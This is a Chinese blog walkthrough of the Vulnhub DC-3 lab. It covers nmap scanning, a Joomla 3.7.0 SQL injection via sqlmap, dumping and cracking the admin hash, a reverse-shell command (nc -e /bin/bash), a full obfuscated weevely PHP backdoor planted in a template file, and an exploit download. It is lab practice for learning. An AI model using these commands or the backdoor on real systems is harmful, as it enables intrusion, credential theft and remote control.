<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Vulnhub靶场DC-3 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Vulnhub靶场DC-3" />
<meta property="og:description" content="本机192.168.223.128
靶机192.168.223.139
目标发现nmap -sP 192.168.223.0/24
端口扫描nmap -p- 192.168.223.139
之开启了一个80端口
看一下是什么服务
nmap -sV -p- -A 192.168.223.139 是一个apache服务，joomla模板
看一下web
没什么有用信息。
扫描一下后台
dirsearch -u http://192.168.223.139/ 有个administator可能是后台界面
看一下
joomla这个cms有个专门漏扫工具
joomscan --help
扫一下
没扫出来什么有用的信息
比较重要的就是这个版本3.7.0，搜一下看看有没有漏洞
看一下这个php文件
把里面的url改成目标机ip
不太管用，换个txt文件看看怎么个回事
看看这42033.txt，版本号完全一致
给了sqlmap的指令，把其中的url改一下
sqlmap -u &#34;http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --current-db -p list[fullordering] 爆出库名了
看一下当前库名
当前是joomladb
看一下表明
sqlmap -u &#34;http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --tables -D joomladb -p list[fullordering] 巨长的表，一般看users
sqlmap -u &#34;http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent -T &#34;#__users&#34; -D joomladb -p list[fullordering] --columns 注意给表名加上双引号不然会被当成注释" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/3ff12bf867d8804d8e8ed79197e7204e/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-26T13:33:28+08:00" />
<meta property="article:modified_time" content="2024-01-26T13:33:28+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Vulnhub靶场DC-3</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>本机192.168.223.128<br> 靶机192.168.223.139<br> 目标发现<code>nmap -sP 192.168.223.0/24</code></p> 
<p><img src="https://images2.imgbox.com/9e/64/g2MpNTfG_o.png" alt="在这里插入图片描述"></p> 
<p>端口扫描<code>nmap -p- 192.168.223.139</code><br> <img src="https://images2.imgbox.com/49/10/tSA0YT0V_o.png" alt="在这里插入图片描述"></p> 
<p>之开启了一个80端口<br> 看一下是什么服务</p> 
<pre><code>nmap -sV -p- -A 192.168.223.139
</code></pre> 
<p><img src="https://images2.imgbox.com/b2/1f/vhtiBpVK_o.png" alt="在这里插入图片描述"></p> 
<p>是一个apache服务，joomla模板<br> 看一下web<br> <img src="https://images2.imgbox.com/a0/8b/cgrQ7JUj_o.png" alt="在这里插入图片描述"></p> 
<p>没什么有用信息。<br> 扫描一下后台</p> 
<pre><code>dirsearch -u http://192.168.223.139/
</code></pre> 
<p><img src="https://images2.imgbox.com/1d/95/w6nzMRYJ_o.png" alt="在这里插入图片描述"></p> 
<p>有个administator可能是后台界面<br> 看一下<br> <img src="https://images2.imgbox.com/29/c2/vGiJ6Bip_o.png" alt="在这里插入图片描述"></p> 
<p>joomla这个cms有个专门漏扫工具<br> joomscan --help</p> 
<p><img src="https://images2.imgbox.com/f3/8e/YQ5Lp5gb_o.png" alt=""><br> 扫一下<br> <img src="https://images2.imgbox.com/e7/bb/CiK27vid_o.png" alt="在这里插入图片描述"></p> 
<p>没扫出来什么有用的信息<br> 比较重要的就是这个版本3.7.0，搜一下看看有没有漏洞<br> <img src="https://images2.imgbox.com/b3/39/l6qc2EQp_o.png" alt="在这里插入图片描述"></p> 
<p>看一下这个php文件<br> 把里面的url改成目标机ip<br> <img src="https://images2.imgbox.com/fa/5e/Fm8HXPaE_o.png" alt="在这里插入图片描述"></p> 
<p>不太管用，换个txt文件看看怎么个回事<br> <img src="https://images2.imgbox.com/e8/84/R52DH1YC_o.png" alt="在这里插入图片描述"></p> 
<p>看看这42033.txt，版本号完全一致<br> <img src="https://images2.imgbox.com/00/66/Qv4DfZg6_o.png" alt="在这里插入图片描述"></p> 
<p>给了sqlmap的指令，把其中的url改一下</p> 
<pre><code>sqlmap -u "http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --current-db -p list[fullordering]
</code></pre> 
<p><img src="https://images2.imgbox.com/9c/e3/mJZjM4H7_o.png" alt="在这里插入图片描述"></p> 
<p>爆出库名了<br> 看一下当前库名<br> <img src="https://images2.imgbox.com/53/a8/RXg2hbXO_o.png" alt="在这里插入图片描述"></p> 
<p>当前是joomladb<br> 看一下表明</p> 
<pre><code>sqlmap -u "http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --tables -D joomladb -p list[fullordering]
</code></pre> 
<p><img src="https://images2.imgbox.com/ef/23/K3h4MRqA_o.png" alt="在这里插入图片描述"></p> 
<p>巨长的表，一般看users</p> 
<pre><code>sqlmap -u "http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -T "#__users" -D joomladb -p list[fullordering] --columns
</code></pre> 
<p>注意给表名加上双引号不然会被当成注释<br> <img src="https://images2.imgbox.com/42/43/dy24hfnV_o.png" alt="在这里插入图片描述"></p> 
<p>这里字典就使用1<br> <img src="https://images2.imgbox.com/84/4a/TYpKkqhb_o.png" alt="在这里插入图片描述"></p> 
<p>有账号密码</p> 
<pre><code>sqlmap -u "http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump -C username,password -T "#__users" -D joomladb -p list[fullordering]
</code></pre> 
<p><img src="https://images2.imgbox.com/6f/21/YJdFs0dq_o.png" alt="在这里插入图片描述"></p> 
<p>admin $2y<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         10 
        
       
      
        10 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6444em;"></span><span class="mord">10</span></span></span></span></span>DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu<br> john爆破一下密码<br> <img src="https://images2.imgbox.com/82/d8/Be9NuHSI_o.png" alt="在这里插入图片描述"></p> 
<p>密码是snoopy<br> <img src="https://images2.imgbox.com/d5/16/wmps4LLv_o.png" alt="在这里插入图片描述"></p> 
<p>登上了<br> <img src="https://images2.imgbox.com/e2/f5/6wg3UAKh_o.png" alt="在这里插入图片描述"></p> 
<p>这里可以文件读取也可以文件上传<br> 发现有个php文件，修改成一句话<br> <img src="https://images2.imgbox.com/b0/88/loyTIn3f_o.png" alt="在这里插入图片描述"></p> 
<p>注意目录是/templates/beez3/html/modules.php<br> 成功rce<br> 现在可以反弹shell<br> 攻击机开个监听端口 nc -lvnp 4567<br> x=system(“nc -e /bin/bash 192.168.223.128 4567”);<br> 发现弹不过来，不知道什么问题。。。（后来发现是靶机的nc 没有-e功能）<br> <img src="https://images2.imgbox.com/31/5d/R74nKSJf_o.png" alt="在这里插入图片描述"></p> 
<p>换个方法，用kali自带的传马工具weevely<br> 先生成在一个马<br> weevely generate x /tmp/shell.php<br> 把里面的内容复制到刚才那个modules.php里面</p> 
<pre><code>&lt;?php
$K='$k="9dd4XAe461";$XAXAkhXA="268c8XA034f5c8XA";$kf="564e15XAXA5c67a6";$XAp="6obiXAXAcjYP3y0JgHXApI";funct';
$X=str_replace('B','','BcBrBeateB_fBBunction');
$c='XAioXAn x($t,$k){XA$c=stXArlXAen(XAXA$k);$l=strlen($tXA);$o="";fXAXAor($XAi=0;$i&lt;$l;){for(XA$j=0;(';
$H='"XA/$khXA(.+)$XAkfXA/",XA@file_get_contentXAsXA("php://input"XAXA),$m)==1)XA {@ob_sXAtart()XA;@evX';
$n='Aal(@gzXAuncompreXAss(@XAx(@base6XA4_decode(XA$mXA[1XA]XA),$k)));$o=@ob_geXAt_conXAtentXAs();@ob_e';
$W='XAnXAd_clean();XA$r=@baseXA6XAXA4_encode(@x(@gzcomXApressXA($o),XAXAXA$k));priXAnt("$p$kh$r$kf");}';
$C='XAXA$j&lt;$cXA&amp;&amp;$i&lt;XA$lXA);$j++,$i++){$XAo.=$tXA{$i}^$XAk{XA$j};}}retuXAXArn $o;}iXAf (@preg_matchXA(';
$r=str_replace('XA','',$K.$c.$C.$H.$n.$W);
$i=$X('',$r);$i();
?&gt;
</code></pre> 
<p>然后连接 weevely http://192.168.223.139/templates/beez3/html/modules.php x</p> 
<p><img src="https://images2.imgbox.com/51/8f/0kGaBn2z_o.png" alt="在这里插入图片描述"></p> 
<p>成功弹回shell</p> 
<p>翻了一圈没找到可以利用的文件，看了别人的wp发现是Ubuntu这个版本有漏洞<br> lsb_release -a看一下自己的Ubuntu版本<br> <img src="https://images2.imgbox.com/03/64/GZo6LIdx_o.png" alt="在这里插入图片描述"></p> 
<p>搜一下版本漏洞<br> <img src="https://images2.imgbox.com/77/45/JCnNUFVY_o.png" alt="在这里插入图片描述"></p> 
<p>看其他人使用这个漏洞，看一下<br> <img src="https://images2.imgbox.com/0b/63/zlMwXeiX_o.png" alt="在这里插入图片描述"></p> 
<p>下载一下exp</p> 
<pre><code>wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip 
</code></pre> 
<p><img src="https://images2.imgbox.com/c3/84/vOL1MxTU_o.png" alt="在这里插入图片描述"></p> 
<p>最后老失败，不知道为什么，晕，基本完成了…</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/437935ab169b7097c4cf6a4ee8bfa4e2/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">jquery多选框，上篇文章后续</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/d19d3a0a5ff4856df223046c4a644b72/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Flink 2.0 状态管理存算分离架构演进</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>